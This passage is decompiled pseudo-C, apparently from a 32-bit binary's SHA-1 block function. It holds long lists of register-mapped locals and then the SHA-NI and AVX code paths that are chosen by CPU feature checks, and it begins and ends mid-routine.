  int v1009; // eax
  int v1010; // edi
  int v1012; // esi
  int v1014; // eax
  int v1016; // ebp
  int v1018; // edi
  int v1019; // edx
  int v1021; // ebp
  int v1023; // edi
  int v1025; // esi
  int v1027; // edx
  int v1028; // ecx
  int v1029; // esi
  int v1031; // edx
  int v1034; // ebp
  int v1035; // ecx
  int v1036; // ebx
  int v1039; // ebp
  int v1040; // ecx
  int v1044; // esi
  int v1045; // ebx
  int v1046; // eax
  int v1048; // esi
  int v1050; // ebx
  int v1053; // ebp
  int v1055; // eax
  int v1056; // edi
  int v1059; // ebp
  int v1061; // eax
  int v1063; // esi
  int v1064; // edi
  int v1065; // edx
  int v1067; // esi
  int v1068; // edi
  int v1069; // ebp
  int v1071; // edx
  int v1072; // ecx
  int v1074; // ebp
  int v1075; // edx
  int v1076; // esi
  int v1077; // ebx
  int v1078; // ecx
  int v1081; // ebp
  int v1082; // eax
  int v1086; // ebx
  int v1088; // esi
  int v1089; // edi
  int v1091; // eax
  int v1093; // ebp
  int v1094; // edx
  int v1095; // edi
  int v1098; // esi
  int v1099; // ecx
  int v1100; // edx
  int v1103; // ebp
  int v1104; // ebx
  int v1108; // ecx
  int v1110; // esi
  int v1111; // eax
  int v1113; // ebx
  int v1115; // ebp
  int v1116; // edi
  int v1117; // eax
  int v1120; // esi
  int v1121; // edx
  int v1122; // edi
  int v1125; // ebp
  int v1126; // ecx
  int v1130; // edx
  int v1132; // esi
  int v1133; // ebx
  int v1135; // ecx
  int v1137; // ebp
  int v1138; // eax
  int v1139; // ebx
  int v1142; // esi
  int v1143; // edi
  int v1144; // eax
  int v1147; // ebp
  int v1148; // edx
  int v1152; // edi
  int v1154; // esi
  int v1155; // ecx
  int v1157; // edx
  int v1159; // ebp
  int v1160; // ebx
  int v1161; // ecx
  int v1164; // esi
  int v1165; // eax
  int v1166; // ebx
  int v1169; // ebp
  int v1170; // edi
  int v1174; // eax
  int v1176; // esi
  int v1177; // edx
  int v1179; // edi
  int v1181; // ebp
  int v1182; // ecx
  int v1183; // edx
  int v1184; // ebx
  int v1187; // ecx
  int v1188; // esi
  int v1189; // ebx
  int v1190; // esi
  int v1191; // ecx
  int v1192; // eax
  int v1195; // esi
  int v1196; // ecx
  int v1197; // ebx
  int v1199; // ebp
  int v1202; // eax
  int v1204; // ebp
  int v1205; // ebx
  int v1206; // edi
  int v1208; // ebp
  int v1209; // ebx
  int v1210; // eax
  int v1211; // esi
  int v1213; // edi
  int v1214; // esi
  int v1215; // eax
  int v1216; // edx
  int v1217; // esi
  int v1219; // eax
  int v1220; // edi
  int v1222; // ebp
  int v1223; // edx
  int v1224; // ebp
  int v1225; // edi
  int v1226; // ecx
  int v1227; // ebp
  int v1228; // edi
  int v1229; // edx
  int v1230; // esi
  int v1231; // ecx
  int v1232; // esi
  int v1233; // edx
  int v1234; // ebx
  int v1237; // esi
  int v1238; // edx
  int v1239; // ecx
  int v1241; // ebp
  int v1244; // ebx
  int v1246; // ebp
  int v1247; // ecx
  int v1248; // eax
  int v1250; // ebp
  int v1251; // ecx
  int v1252; // ebx
  int v1253; // esi
  int v1255; // eax
  int v1256; // esi
  int v1257; // ebx
  int v1258; // edi
  int v1259; // esi
  int v1261; // ebx
  int v1262; // eax
  int v1264; // ebp
  int v1265; // edi
  int v1266; // ebp
  int v1267; // eax
  int v1268; // edx
  int v1269; // ebp
  int v1270; // eax
  int v1271; // edi
  int v1272; // esi
  int v1273; // edx
  int v1274; // esi
  int v1275; // edi
  int v1276; // ecx
  int v1279; // esi
  int v1280; // edi
  int v1281; // edx
  int v1283; // ebp
  int v1286; // ecx
  int v1288; // ebp
  int v1289; // edx
  int v1290; // ebx
  int v1292; // ebp
  int v1293; // edx
  int v1294; // ecx
  int v1295; // esi
  int v1297; // ebx
  int v1298; // esi
  int v1299; // ecx
  int v1300; // eax
  int v1301; // esi
  int v1303; // ecx
  int v1304; // ebx
  int v1306; // ebp
  int v1307; // eax
  int v1308; // ebp
  int v1309; // ebx
  int v1310; // edi
  int v1311; // ebp
  int v1312; // ebx
  int v1313; // eax
  int v1314; // esi
  int v1315; // edi
  int v1316; // esi
  int v1317; // eax
  int v1318; // edx
  int v1321; // esi
  int v1322; // eax
  int v1323; // edi
  int v1325; // ebp
  int v1328; // edx
  int v1330; // ebp
  int v1331; // edi
  int v1332; // ecx
  int v1334; // ebp
  int v1335; // edi
  int v1336; // edx
  int v1337; // esi
  int v1339; // ecx
  int v1340; // esi
  int v1341; // edx
  int v1342; // ebx
  int v1343; // esi
  int v1345; // edx
  int v1346; // ecx
  int v1348; // ebp
  int v1349; // ebx
  int v1350; // ebp
  int v1351; // ecx
  int v1352; // eax
  int v1353; // ebp
  int v1354; // ecx
  int v1355; // ebx
  int v1356; // esi
  int v1357; // eax
  int v1358; // esi
  int v1359; // ebx
  int v1360; // edi
  int v1363; // esi
  int v1364; // ebx
  int v1365; // eax
  int v1367; // ebp
  int v1370; // edi
  int v1372; // ebp
  int v1373; // eax
  int v1374; // edx
  int v1376; // ebp
  int v1377; // eax
  int v1378; // edi
  int v1379; // esi
  int v1381; // edx
  int v1382; // esi
  int v1383; // edi
  int v1384; // ecx
  int v1385; // esi
  int v1387; // edi
  int v1388; // edx
  int v1390; // ebp
  int v1391; // ecx
  int v1392; // ebp
  int v1393; // edx
  int v1394; // ebx
  int v1395; // ebp
  int v1396; // edx
  int v1397; // ecx
  int v1398; // esi
  int v1399; // ebx
  int v1402; // ebp
  int v1403; // eax
  int v1407; // ebx
  int v1409; // esi
  int v1410; // edi
  int v1412; // eax
  int v1414; // ebp
  int v1415; // edx
  int v1416; // edi
  int v1418; // esi
  int v1419; // ecx
  int v1420; // edx
  int v1422; // ebp
  int v1423; // ebx
  int v1424; // ecx
  int v1425; // esi
  int v1426; // eax
  int v1427; // ebx
  int v1428; // ebp
  int v1429; // edi
  int v1430; // eax
  int v1431; // edx
  int v1432; // esi
  int v1433; // edi
  int v1434; // ecx
  int v1441; // ebp
  int v1442; // ecx
  unsigned __int64 v1443; // rt0
  int v1445; // edx
  int v1446; // esi
  int v1447; // ebx
  int v1448; // ecx
  int v1449; // ebp
  int v1450; // eax
  int v1451; // ebx
  int v1452; // esi
  int v1453; // edi
  int v1454; // eax
  int v1455; // ebp
  int v1456; // edx
  int v1458; // edi
  int v1459; // esi
  int v1460; // ecx
  int v1461; // edx
  int v1462; // ebp
  int v1463; // ebx
  int v1464; // ecx
  int v1465; // esi
  int v1466; // eax
  int v1467; // ebx
  int v1468; // ebp
  int v1469; // edi
  int v1471; // eax
  int v1472; // esi
  int v1473; // edx
  int v1474; // edi
  int v1475; // ebp
  int v1476; // ecx
  int v1477; // edx
  int v1478; // esi
  int v1479; // ebx
  int v1480; // eax
  _DWORD *v1481; // ebp
  __int32 v1482; // esi
  __int32 v1483; // ebp
  int v1484; // ebp
  int v1485; // ecx
  unsigned __int64 v1486; // rt0
  int v1487; // edx
  int v1488; // esi
  int v1489; // ebx
  int v1490; // ecx
  int v1491; // ebp
  int v1492; // eax
  int v1493; // ebx
  int v1494; // esi
  int v1495; // edi
  int v1496; // eax
  int v1497; // ebp
  int v1498; // edx
  int v1499; // edi
  int v1500; // esi
  int v1501; // ecx
  int v1502; // edx
  int v1503; // ebp
  int v1504; // ebx
  int v1505; // ecx
  int v1506; // esi
  int v1507; // eax
  int v1508; // ebx
  int v1509; // ebp
  int v1510; // edi
  int v1511; // eax
  int v1512; // esi
  int v1513; // edx
  int v1514; // edi
  int v1515; // ebp
  int v1516; // ecx
  int v1517; // edx
  int v1518; // esi
  int v1519; // ebx
  int v1520; // eax
  _DWORD *v1521; // ebp
  int v1522; // esi
  int v1523; // ecx
  int v1524; // edx
  int v1525; // edi
  __m128i v1526; // [esp+0h] [ebp-E0h]
  __m128i v1527; // [esp+0h] [ebp-E0h]
  __m128i v1528; // [esp+0h] [ebp-E0h]
  __m128i v1529; // [esp+0h] [ebp-E0h]
  __m128i v1530; // [esp+0h] [ebp-E0h]
  __int128 v1531; // [esp+0h] [ebp-E0h]
  __int128 v1532; // [esp+0h] [ebp-E0h]
  __int128 v1533; // [esp+0h] [ebp-E0h]
  __int128 v1534; // [esp+0h] [ebp-E0h]
  __int128 v1535; // [esp+0h] [ebp-E0h]
  __m128i v1536; // [esp+10h] [ebp-D0h]
  __m128i v1537; // [esp+10h] [ebp-D0h]
  __m128i v1538; // [esp+10h] [ebp-D0h]
  __m128i v1539; // [esp+10h] [ebp-D0h]
  __m128i v1540; // [esp+10h] [ebp-D0h]
  __int128 v1541; // [esp+10h] [ebp-D0h]
  __int128 v1542; // [esp+10h] [ebp-D0h]
  __int128 v1543; // [esp+10h] [ebp-D0h]
  __int128 v1544; // [esp+10h] [ebp-D0h]
  __int128 v1545; // [esp+10h] [ebp-D0h]
  __m128i v1546; // [esp+20h] [ebp-C0h]
  __m128i v1547; // [esp+20h] [ebp-C0h]
  __m128i v1548; // [esp+20h] [ebp-C0h]
  __m128i v1549; // [esp+20h] [ebp-C0h]
  __m128i v1550; // [esp+20h] [ebp-C0h]
  __int128 v1551; // [esp+20h] [ebp-C0h]
  __int128 v1552; // [esp+20h] [ebp-C0h]
  __int128 v1553; // [esp+20h] [ebp-C0h]
  __int128 v1554; // [esp+20h] [ebp-C0h]
  __int128 v1555; // [esp+20h] [ebp-C0h]
  __m128i v1556; // [esp+30h] [ebp-B0h]
  __m128i v1557; // [esp+30h] [ebp-B0h]
  __m128i v1558; // [esp+30h] [ebp-B0h]
  __m128i v1559; // [esp+30h] [ebp-B0h]
  __m128i v1560; // [esp+30h] [ebp-B0h]
  __int128 v1561; // [esp+30h] [ebp-B0h]
  __int128 v1562; // [esp+30h] [ebp-B0h]
  __int128 v1563; // [esp+30h] [ebp-B0h]
  __int128 v1564; // [esp+30h] [ebp-B0h]
  __int128 v1565; // [esp+30h] [ebp-B0h]
  __m128i v1566; // [esp+40h] [ebp-A0h] BYREF
  __m128i v1567; // [esp+50h] [ebp-90h] BYREF
  __m128i v1568; // [esp+60h] [ebp-80h] BYREF
  __m128i v1569; // [esp+70h] [ebp-70h] BYREF
  __m128i v1570; // [esp+80h] [ebp-60h] BYREF
  __m128i v1571; // [esp+90h] [ebp-50h] BYREF
  __m128i v1572; // [esp+A0h] [ebp-40h] BYREF
  __m128i v1573; // [esp+B0h] [ebp-30h] BYREF
  __m128i v1574; // [esp+C0h] [ebp-20h]
  _BYTE v1575[16]; // [esp+D0h] [ebp-10h] BYREF
  unsigned int *v1576; // [esp+E8h] [ebp+8h]
  unsigned int v1577; // [esp+ECh] [ebp+Ch]

  v1574.m128i_i32[3] = 4625673;
  _EBP = 4637824;
  v4 = *(&dword_73C6D0 + 1);
  if ( (v4 & 0x200) != 0 && (dword_73C6D0 & 0x1000000) != 0 )
  {
    if ( (*(&dword_73C6D0 + 2) & 0x20000000) != 0 )
    {
      v260 = a2;
      v261 = a3;
      si128 = _mm_load_si128((const __m128i *)(v1574.m128i_i32[3] + 12231));
      _XMM0 = _mm_shuffle_epi32(_mm_loadu_si128(a1), 27);
      _XMM1 = _mm_shuffle_epi32(_mm_cvtsi32_si128(a1[1].m128i_u32[0]), 27);
      _XMM4 = _mm_shuffle_epi8(_mm_loadu_si128(a2), si128);
      _XMM5 = _mm_shuffle_epi8(_mm_loadu_si128(a2 + 1), si128);
      _XMM6 = _mm_shuffle_epi8(_mm_loadu_si128(a2 + 2), si128);
      _XMM7 = _mm_shuffle_epi8(_mm_loadu_si128(a2 + 3), si128);
      do
      {
        --v261;
        result = (int)v260[4].m128i_i32;
        v1573 = _XMM1;
        _XMM1 = _mm_add_epi32(_XMM1, _XMM4);
        if ( v261 )
          v260 += 4;
        v1574 = _XMM0;
        __asm { sha1msg1 xmm4, xmm5 }
        _XMM2 = _XMM0;
        __asm
        {
          sha1rnds4 xmm0, xmm1, 0
          sha1nexte xmm2, xmm5
        }
        _XMM4 = _mm_xor_si128(_XMM4, _XMM6);
        __asm
        {
          sha1msg1 xmm5, xmm6
          sha1msg2 xmm4, xmm7
        }
        _XMM1 = _XMM0;
        __asm
        {
          sha1rnds4 xmm0, xmm2, 0
          sha1nexte xmm1, xmm6
        }
        _XMM5 = _mm_xor_si128(_XMM5, _XMM7);
        __asm
        {
          sha1msg2 xmm5, xmm4
          sha1msg1 xmm6, xmm7
        }
        _XMM2 = _XMM0;
        __asm
        {
          sha1rnds4 xmm0, xmm1, 0
          sha1nexte xmm2, xmm7
        }
        _XMM6 = _mm_xor_si128(_XMM6, _XMM4);
        __asm
        {
          sha1msg1 xmm7, xmm4
          sha1msg2 xmm6, xmm5
        }
        _XMM1 = _XMM0;
        __asm
        {
          sha1rnds4 xmm0, xmm2, 0
          sha1nexte xmm1, xmm4
        }
        _XMM7 = _mm_xor_si128(_XMM7, _XMM5);
        __asm
        {
          sha1msg2 xmm7, xmm6
          sha1msg1 xmm4, xmm5
        }
        _XMM2 = _XMM0;
        __asm
        {
          sha1rnds4 xmm0, xmm1, 0
          sha1nexte xmm2, xmm5
        }
        _XMM4 = _mm_xor_si128(_XMM4, _XMM6);
        __asm
        {
          sha1msg1 xmm5, xmm6
          sha1msg2 xmm4, xmm7
        }
        _XMM1 = _XMM0;
        __asm
        {
          sha1rnds4 xmm0, xmm2, 1
          sha1nexte xmm1, xmm6
        }
        _XMM5 = _mm_xor_si128(_XMM5, _XMM7);
        __asm
        {
          sha1msg2 xmm5, xmm4
          sha1msg1 xmm6, xmm7
        }
        _XMM2 = _XMM0;
        __asm
        {
          sha1rnds4 xmm0, xmm1, 1
          sha1nexte xmm2, xmm7
        }
        _XMM6 = _mm_xor_si128(_XMM6, _XMM4);
        __asm
        {
          sha1msg1 xmm7, xmm4
          sha1msg2 xmm6, xmm5
        }
        _XMM1 = _XMM0;
        __asm
        {
          sha1rnds4 xmm0, xmm2, 1
          sha1nexte xmm1, xmm4
        }
        _XMM7 = _mm_xor_si128(_XMM7, _XMM5);
        __asm
        {
          sha1msg2 xmm7, xmm6
          sha1msg1 xmm4, xmm5
        }
        _XMM2 = _XMM0;
        __asm
        {
          sha1rnds4 xmm0, xmm1, 1
          sha1nexte xmm2, xmm5
        }
        _XMM4 = _mm_xor_si128(_XMM4, _XMM6);
        __asm
        {
          sha1msg1 xmm5, xmm6
          sha1msg2 xmm4, xmm7
        }
        _XMM1 = _XMM0;
        __asm
        {
          sha1rnds4 xmm0, xmm2, 1
          sha1nexte xmm1, xmm6
        }
        _XMM5 = _mm_xor_si128(_XMM5, _XMM7);
        __asm
        {
          sha1msg2 xmm5, xmm4
          sha1msg1 xmm6, xmm7
        }
        _XMM2 = _XMM0;
        __asm
        {
          sha1rnds4 xmm0, xmm1, 2
          sha1nexte xmm2, xmm7
        }
        _XMM6 = _mm_xor_si128(_XMM6, _XMM4);
        __asm
        {
          sha1msg1 xmm7, xmm4
          sha1msg2 xmm6, xmm5
        }
        _XMM1 = _XMM0;
        __asm
        {
          sha1rnds4 xmm0, xmm2, 2
          sha1nexte xmm1, xmm4
        }
        _XMM7 = _mm_xor_si128(_XMM7, _XMM5);
        __asm
        {
          sha1msg2 xmm7, xmm6
          sha1msg1 xmm4, xmm5
        }
        _XMM2 = _XMM0;
        __asm
        {
          sha1rnds4 xmm0, xmm1, 2
          sha1nexte xmm2, xmm5
        }
        _XMM4 = _mm_xor_si128(_XMM4, _XMM6);
        __asm
        {
          sha1msg1 xmm5, xmm6
          sha1msg2 xmm4, xmm7
        }
        _XMM1 = _XMM0;
        __asm
        {
          sha1rnds4 xmm0, xmm2, 2
          sha1nexte xmm1, xmm6
        }
        _XMM5 = _mm_xor_si128(_XMM5, _XMM7);
        __asm
        {
          sha1msg2 xmm5, xmm4
          sha1msg1 xmm6, xmm7
        }
        _XMM2 = _XMM0;
        __asm
        {
          sha1rnds4 xmm0, xmm1, 2
          sha1nexte xmm2, xmm7
        }
        _XMM6 = _mm_xor_si128(_XMM6, _XMM4);
        __asm
        {
          sha1msg1 xmm7, xmm4
          sha1msg2 xmm6, xmm5
        }
        _XMM1 = _XMM0;
        __asm
        {
          sha1rnds4 xmm0, xmm2, 3
          sha1nexte xmm1, xmm4
        }
        _XMM7 = _mm_xor_si128(_XMM7, _XMM5);
        __asm { sha1msg2 xmm7, xmm6 }
        _XMM2 = _XMM0;
        __asm
        {
          sha1rnds4 xmm0, xmm1, 3
          sha1nexte xmm2, xmm5
        }
        _XMM4 = _mm_shuffle_epi8(_mm_loadu_si128(v260), si128);
        _XMM1 = _XMM0;
        __asm
        {
          sha1rnds4 xmm0, xmm2, 3
          sha1nexte xmm1, xmm6
        }
        _XMM5 = _mm_shuffle_epi8(_mm_loadu_si128(v260 + 1), si128);
        _XMM2 = _XMM0;
        __asm
        {
          sha1rnds4 xmm0, xmm1, 3
          sha1nexte xmm2, xmm7
        }
        _XMM6 = _mm_shuffle_epi8(_mm_loadu_si128(v260 + 2), si128);
        _XMM1 = _XMM0;
        __asm { sha1rnds4 xmm0, xmm2, 3 }
        _XMM2 = _mm_load_si128(&v1573);
        _XMM7 = _mm_shuffle_epi8(_mm_loadu_si128(v260 + 3), si128);
        __asm { sha1nexte xmm1, xmm2 }
        _XMM0 = _mm_add_epi32(_XMM0, v1574);
      }
      while ( v261 );
      *a1 = _mm_shuffle_epi32(_XMM0, 27);
      a1[1].m128i_i32[0] = _mm_cvtsi128_si32(_mm_shuffle_epi32(_XMM1, 27));
    }
    else if ( (v4 & 0x10000000 | dword_73C6D0 & 0x40000000) == 1342177280 )
    {
      __asm
      {
        vzeroall
        vmovdqa xmm7, xmmword ptr [ebp+0]
        vmovdqa xmm0, xmmword ptr [ebp+10h]
        vmovdqa xmm1, xmmword ptr [ebp+20h]
        vmovdqa xmm2, xmmword ptr [ebp+30h]
        vmovdqa xmm6, xmmword ptr [ebp+40h]
        vmovdqa [esp+0E0h+var_70], xmm0
        vmovdqa xmmword ptr [esp+80h], xmm1
        vmovdqa [esp+0E0h+var_50], xmm2
        vmovdqa [esp+0E0h+var_40], xmm7
        vmovdqa [esp+0E0h+var_30], xmm6
      }
      v1574.m128i_i32[0] = (__int32)a1;
      v1574.m128i_i32[1] = (__int32)a2[4].m128i_i32;
      v1574.m128i_i32[2] = (__int32)a2[4 * a3].m128i_i32;
      v1574.m128i_i32[3] = (__int32)v1575;
      v891 = a1->m128i_i32[0];
      v892 = a1->m128i_i32[1];
      v893 = a1->m128i_i32[2];
      v894 = a1->m128i_i32[3];
      v895 = a1[1].m128i_i32[0];
      __asm
      {
        vmovdqu xmm0, xmmword ptr [ebp-40h]
        vmovdqu xmm1, xmmword ptr [ebp-30h]
        vmovdqu xmm2, xmmword ptr [ebp-20h]
        vmovdqu xmm3, xmmword ptr [ebp-10h]
        vpshufb xmm0, xmm0, xmm6
        vpshufb xmm1, xmm1, xmm6
        vpshufb xmm2, xmm2, xmm6
        vmovdqa [esp+0E0h+var_80], xmm7
        vpshufb xmm3, xmm3, xmm6
        vpaddd  xmm4, xmm0, xmm7
        vpaddd  xmm5, xmm1, xmm7
        vpaddd  xmm6, xmm2, xmm7
        vmovdqa [esp+0E0h+var_E0], xmm4
        vmovdqa [esp+0E0h+var_D0], xmm5
        vmovdqa [esp+0E0h+var_C0], xmm6
      }
      v907 = (v894 ^ v893) & v892;
      while ( 1 )
      {
        LODWORD(v908) = v892;
        HIDWORD(v908) = v892;
        __asm { vpalignr xmm4, xmm1, xmm0, 8 }
        v910 = v891;
        __asm
        {
          vpaddd  xmm7, xmm7, xmm3
          vmovdqa [esp+0E0h+var_A0], xmm0
        }
        v912 = v893 ^ (v908 >> 2);
        HIDWORD(v908) = v891;
        LODWORD(v908) = v891;
        v913 = v908 >> 27;
        __asm { vpsrldq xmm6, xmm3, 4 }
        v915 = v912 & v910;
        __asm { vpxor   xmm4, xmm4, xmm0 }
        v917 = v893 ^ v912;
        __asm { vpxor   xmm6, xmm6, xmm2 }
        LODWORD(v908) = v913;
        HIDWORD(v908) = v913;
        __asm { vmovdqa [esp+0E0h+var_B0], xmm7 }
        v919 = v913 + (v894 ^ v907) + v1531 + v895;
        __asm { vpxor   xmm4, xmm4, xmm6 }
        v921 = v917 ^ (v908 >> 7);
        HIDWORD(v908) = v919;
        LODWORD(v908) = v919;
        v922 = v908 >> 27;
        v923 = v921 & v919;
        __asm { vpsrld  xmm6, xmm4, 1Fh }
        v925 = v917 ^ v921;
        LODWORD(v908) = v922;
        HIDWORD(v908) = v922;
        __asm
        {
          vpslldq xmm0, xmm4, 0Ch
          vpaddd  xmm4, xmm4, xmm4
        }
        v928 = v922 + (v893 ^ v915) + DWORD1(v1531) + v894;
        v929 = v925 ^ (v908 >> 7);
        HIDWORD(v908) = v928;
        LODWORD(v908) = v928;
        v930 = v908 >> 27;
        __asm
        {
          vpsrld  xmm7, xmm0, 1Eh
          vpor    xmm4, xmm4, xmm6
        }
        v933 = v929 & v928;
        v934 = v925 ^ v929;
        __asm { vpslld  xmm0, xmm0, 2 }
        LODWORD(v908) = v930;
        HIDWORD(v908) = v930;
        __asm { vpxor   xmm4, xmm4, xmm7 }
        v937 = v930 + (v917 ^ v923) + DWORD2(v1531) + v893;
        v938 = v934 ^ (v908 >> 7);
        HIDWORD(v908) = v937;
        LODWORD(v908) = v937;
        v939 = v908 >> 27;
        __asm { vpxor   xmm4, xmm4, xmm0 }
        v941 = v938 & v937;
        __asm { vmovdqa xmm0, [esp+0E0h+var_80] }
        v943 = v934 ^ v938;
        LODWORD(v908) = v939;
        HIDWORD(v908) = v939;
        __asm { vpalignr xmm5, xmm2, xmm1, 8 }
        v945 = v939 + (v925 ^ v933) + HIDWORD(v1531) + v917;
        __asm
        {
          vpaddd  xmm0, xmm0, xmm4
          vmovdqa [esp+0E0h+var_90], xmm1
        }
        v947 = v943 ^ (v908 >> 7);
        HIDWORD(v908) = v945;
        LODWORD(v908) = v945;
        v948 = v908 >> 27;
        __asm { vpsrldq xmm7, xmm4, 4 }
        v950 = v947 & v945;
        __asm { vpxor   xmm5, xmm5, xmm1 }
        v952 = v943 ^ v947;
        __asm { vpxor   xmm7, xmm7, xmm3 }
        LODWORD(v908) = v948;
        HIDWORD(v908) = v948;
        __asm { vmovdqa [esp+0E0h+var_E0], xmm0 }
        v954 = v948 + (v934 ^ v941) + v1541 + v925;
        __asm { vpxor   xmm5, xmm5, xmm7 }
        v956 = v952 ^ (v908 >> 7);
        HIDWORD(v908) = v954;
        LODWORD(v908) = v954;
        v957 = v908 >> 27;
        v958 = v956 & v954;
        __asm { vpsrld  xmm7, xmm5, 1Fh }
        v960 = v952 ^ v956;
        LODWORD(v908) = v957;
        HIDWORD(v908) = v957;
        __asm
        {
          vpslldq xmm1, xmm5, 0Ch
          vpaddd  xmm5, xmm5, xmm5
        }
        v963 = v957 + (v943 ^ v950) + DWORD1(v1541) + v934;
        v964 = v960 ^ (v908 >> 7);
        HIDWORD(v908) = v963;
        LODWORD(v908) = v963;
        v965 = v908 >> 27;
        __asm
        {
          vpsrld  xmm0, xmm1, 1Eh
          vpor    xmm5, xmm5, xmm7
        }
        v968 = v964 & v963;
        v969 = v960 ^ v964;
        __asm { vpslld  xmm1, xmm1, 2 }
        LODWORD(v908) = v965;
        HIDWORD(v908) = v965;
        __asm { vpxor   xmm5, xmm5, xmm0 }
        v972 = v965 + (v952 ^ v958) + DWORD2(v1541) + v943;
        v973 = v969 ^ (v908 >> 7);
        HIDWORD(v908) = v972;
        LODWORD(v908) = v972;
        v974 = v908 >> 27;
        __asm { vpxor   xmm5, xmm5, xmm1 }
        v976 = v973 & v972;
        __asm { vmovdqa xmm1, [esp+0E0h+var_70] }
        v978 = v969 ^ v973;
        LODWORD(v908) = v974;
        HIDWORD(v908) = v974;
        __asm { vpalignr xmm6, xmm3, xmm2, 8 }
        v980 = v974 + (v960 ^ v968) + HIDWORD(v1541) + v952;
        __asm
        {
          vpaddd  xmm1, xmm1, xmm5
          vmovdqa [esp+0E0h+var_80], xmm2
        }
        v982 = v978 ^ (v908 >> 7);
        HIDWORD(v908) = v980;
        LODWORD(v908) = v980;
        v983 = v908 >> 27;
        __asm { vpsrldq xmm0, xmm5, 4 }
        v985 = v982 & v980;
        __asm { vpxor   xmm6, xmm6, xmm2 }
        v987 = v978 ^ v982;
        __asm { vpxor   xmm0, xmm0, xmm4 }
        LODWORD(v908) = v983;
        HIDWORD(v908) = v983;
        __asm { vmovdqa [esp+0E0h+var_D0], xmm1 }
        v989 = v983 + (v969 ^ v976) + v1551 + v960;
        __asm { vpxor   xmm6, xmm6, xmm0 }
        v991 = v987 ^ (v908 >> 7);
        HIDWORD(v908) = v989;
        LODWORD(v908) = v989;
        v992 = v908 >> 27;
        v993 = v991 & v989;
        __asm { vpsrld  xmm0, xmm6, 1Fh }
        v995 = v987 ^ v991;
        LODWORD(v908) = v992;
        HIDWORD(v908) = v992;
        __asm
        {
          vpslldq xmm2, xmm6, 0Ch
          vpaddd  xmm6, xmm6, xmm6
        }
        v998 = v992 + (v978 ^ v985) + DWORD1(v1551) + v969;
        v999 = v995 ^ (v908 >> 7);
        HIDWORD(v908) = v998;
        LODWORD(v908) = v998;
        v1000 = v908 >> 27;
        __asm
        {
          vpsrld  xmm1, xmm2, 1Eh
          vpor    xmm6, xmm6, xmm0
        }
        v1003 = v999 & v998;
        v1004 = v995 ^ v999;
        __asm
        {
          vpslld  xmm2, xmm2, 2
          vmovdqa xmm0, [esp+0E0h+var_A0]
        }
        LODWORD(v908) = v1000;
        HIDWORD(v908) = v1000;
        __asm { vpxor   xmm6, xmm6, xmm1 }
        v1008 = v1000 + (v987 ^ v993) + DWORD2(v1551) + v978;
        v1009 = v1004 ^ (v908 >> 7);
        HIDWORD(v908) = v1008;
        LODWORD(v908) = v1008;
        v1010 = v908 >> 27;
        __asm { vpxor   xmm6, xmm6, xmm2 }
        v1012 = v1009 & v1008;
        __asm { vmovdqa xmm2, [esp+0E0h+var_70] }
        v1014 = v1004 ^ v1009;
        LODWORD(v908) = v1010;
        HIDWORD(v908) = v1010;
        __asm { vpalignr xmm7, xmm4, xmm3, 8 }
        v1016 = v1010 + (v995 ^ v1003) + HIDWORD(v1551) + v987;
        __asm
        {
          vpaddd  xmm2, xmm2, xmm6
          vmovdqa [esp+0E0h+var_A0], xmm3
        }
        v1018 = v1014 ^ (v908 >> 7);
        HIDWORD(v908) = v1016;
        LODWORD(v908) = v1016;
        v1019 = v908 >> 27;
        __asm { vpsrldq xmm1, xmm6, 4 }
        v1021 = v1018 & v1016;
        __asm { vpxor   xmm7, xmm7, xmm3 }
        v1023 = v1014 ^ v1018;
        __asm { vpxor   xmm1, xmm1, xmm5 }
        LODWORD(v908) = v1019;
        HIDWORD(v908) = v1019;
        __asm { vmovdqa [esp+0E0h+var_C0], xmm2 }
        v1025 = v1019 + (v1004 ^ v1012) + v1561 + v995;
        __asm { vpxor   xmm7, xmm7, xmm1 }
        v1027 = v1023 ^ (v908 >> 7);
        HIDWORD(v908) = v1025;
        LODWORD(v908) = v1025;
        v1028 = v908 >> 27;
        v1029 = v1027 & v1025;
        __asm { vpsrld  xmm1, xmm7, 1Fh }
        v1031 = v1023 ^ v1027;
        LODWORD(v908) = v1028;
        HIDWORD(v908) = v1028;
        __asm
        {
          vpslldq xmm3, xmm7, 0Ch
          vpaddd  xmm7, xmm7, xmm7
        }
        v1034 = v1028 + (v1014 ^ v1021) + DWORD1(v1561) + v1004;
        v1035 = v1031 ^ (v908 >> 7);
        HIDWORD(v908) = v1034;
        LODWORD(v908) = v1034;
        v1036 = v908 >> 27;
        __asm
        {
          vpsrld  xmm2, xmm3, 1Eh
          vpor    xmm7, xmm7, xmm1
        }
        v1039 = v1035 & v1034;
        v1040 = v1031 ^ v1035;
        __asm
        {
          vpslld  xmm3, xmm3, 2
          vmovdqa xmm1, [esp+0E0h+var_90]
        }
        LODWORD(v908) = v1036;
        HIDWORD(v908) = v1036;
        __asm { vpxor   xmm7, xmm7, xmm2 }
        v1044 = v1036 + (v1023 ^ v1029) + DWORD2(v1561) + v1014;
        v1045 = v1040 ^ (v908 >> 7);
        HIDWORD(v908) = v1044;
        LODWORD(v908) = v1044;
        v1046 = v908 >> 27;
        __asm { vpxor   xmm7, xmm7, xmm3 }
        v1048 = v1045 & v1044;
        __asm { vmovdqa xmm3, [esp+0E0h+var_70] }
        v1050 = v1040 ^ v1045;
        __asm
        {
          vpalignr xmm2, xmm7, xmm6, 8
          vpxor   xmm0, xmm0, xmm4
        }
        LODWORD(v908) = v1046;
        HIDWORD(v908) = v1046;
        v1053 = v1046 + (v1031 ^ v1039) + HIDWORD(v1561) + v1023;
        __asm
        {
          vpxor   xmm0, xmm0, xmm1
          vmovdqa [esp+0E0h+var_90], xmm4
        }
        v1055 = v1050 ^ (v908 >> 7);
        HIDWORD(v908) = v1053;
        LODWORD(v908) = v1053;
        v1056 = v908 >> 27;
        __asm
        {
          vmovdqa xmm4, xmm3
          vpaddd  xmm3, xmm3, xmm7
        }
        v1059 = v1055 & v1053;
        __asm { vpxor   xmm0, xmm0, xmm2 }
        v1061 = v1050 ^ v1055;
        LODWORD(v908) = v1056;
        HIDWORD(v908) = v1056;
        __asm
        {
          vpsrld  xmm2, xmm0, 1Eh
          vmovdqa [esp+0E0h+var_B0], xmm3
        }
        v1063 = v1056 + (v1040 ^ v1048) + v1532 + v1031;
        v1064 = v1061 ^ (v908 >> 7);
        HIDWORD(v908) = v1063;
        LODWORD(v908) = v1063;
        v1065 = v908 >> 27;
        __asm { vpslld  xmm0, xmm0, 2 }
        v1067 = v1064 & v1063;
        v1068 = v1061 ^ v1064;
        LODWORD(v908) = v1065;
        HIDWORD(v908) = v1065;
        v1069 = v1065 + (v1050 ^ v1059) + DWORD1(v1532) + v1040;
